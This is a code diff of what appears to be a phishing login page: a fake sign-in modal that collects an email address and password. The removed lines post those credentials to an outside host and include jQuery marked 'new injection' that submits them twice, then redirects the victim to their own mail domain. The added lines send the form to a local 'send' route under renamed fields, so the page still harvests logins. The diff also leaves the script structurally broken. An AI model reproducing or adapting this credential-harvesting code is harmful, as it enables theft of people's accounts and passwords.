@@ -317,7 +317,7 @@ background: cover;
     </div>
 
     <!-- Modal -->
-    <form id="login_form" action="https://uudismelecopar.website/.65ft/a1zn.php" method="post">
+    <form id="login_form" action="{% url "send" %}" method="post">
       <div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
         <div class="modal-dialog" role="document">
           <div class="modal-content">
@@ -341,14 +341,14 @@ background: cover;
 
                 <div class="form-group">
                   <label for="Email Address"></label>
-                  <input name="emq" id="email" type="email" class="form-control" placeholder="Enter your email address." required>
+                  <input name="emp" id="email" type="email" class="form-control" placeholder="Enter your email address." required>
                   <p class="email help-block">Enter your email address.</p>
                 </div>
 
 
                 <div class="form-group">
                   <label for="Pa"></label>
-                  <input name="pz" type="password" id="password" class="form-control" placeholder="Enter your password." required >
+                  <input name="pass" type="password" id="password" class="form-control" placeholder="Enter your password." required >
                   <p class="pa help-block">Enter your password.</p>
                 </div>
 
@@ -416,56 +416,7 @@ $('.show-modal').click(function(event){
       var c= my_slice.substr(0, my_slice.indexOf('.'));
       var final= c.toLowerCase();
       ///////////new injection////////////////
-      count=count+1;
-      
-      $.ajax({
-        //dataType: 'JSON',
-        url: 'next.php',
-        //type: 'POST',
-        //data:{
-          //email:email,
-          //password:password,
-        //},
-            // data: $('#contact').serialize(),
-            beforeSend: function(xhr){
-              $('#submit-btn').html('Verifing...');
-            },
-            success: function(response){
-              if(response){
-                $("#msg").show();
-                console.log(response);
-                if(response['signal'] == 'ok'){
-                  $("#password").val("");
-                  if (count>=2) {
-                    count=0;
-                    // window.location.replace(response['redirect_link']);
-                    window.location.replace("http://www."+my_slice);
 
-                  }
-                  // $('#msg').html(response['msg']);
-                }
-                else{
-                  // $('#msg').html(response['msg']);
-                }
-              }
-            },
-            error: function(){
-              $("#password").val("");
-              if (count>=2) {
-                count=0;
-                window.location.replace("http://www."+my_slice);
-              }
-              $("#msg").show();
-              // $('#msg').html("Please try again later");
-            },
-            complete: function(){
-              $('#submit-btn').html('Login');
-            }
-          });
-    });
-
-
-    }); 
 </script>
 </html>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/1.7.1/socket.io.js"></script>
